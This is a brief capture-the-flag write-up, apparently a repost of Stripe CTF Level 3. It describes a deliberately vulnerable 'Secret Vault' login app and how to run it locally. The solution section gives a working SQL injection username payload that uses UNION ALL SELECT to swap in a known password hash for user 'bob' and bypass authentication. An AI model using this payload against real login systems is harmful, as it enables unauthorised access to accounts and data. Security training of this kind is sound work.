## Level 3

After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like [Unbreakable Linux](http://www.oracle.com/us/technologies/linux/ubreakable-enterprise-kernel-linux-173350.html)). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.

A beta version has launched with some interesting secrets (including the password to access Level 4); you can check it out at https://level03-1.stripe-ctf.com/user-xxxxxxxxxx. As usual, you can fetch the code for the level (and some sample data) via `git clone https://level03-1.stripe-ctf.com/user-xxxxxxxxxx/level03-code`, or you can read the code below.

### Running

- Run 'pip install flask flup'
- Run 'python secretvault.py'. This will automatically generate test data for you.
- Visit 'localhost:5000' in your web browser

### Solution

  * Username: `' UNION ALL SELECT id, '7a37b85c8918eac19a9089c0fa5a2ab4dce3f90528dcdeec108b23ddf3607b99' as 'password_hash', 'salt' AS 'salt' FROM users where username = 'bob' or 1='`
  * Password: `password`

Originally posted at [https://stripe-ctf.com/levels/3](https://stripe-ctf.com/levels/3).
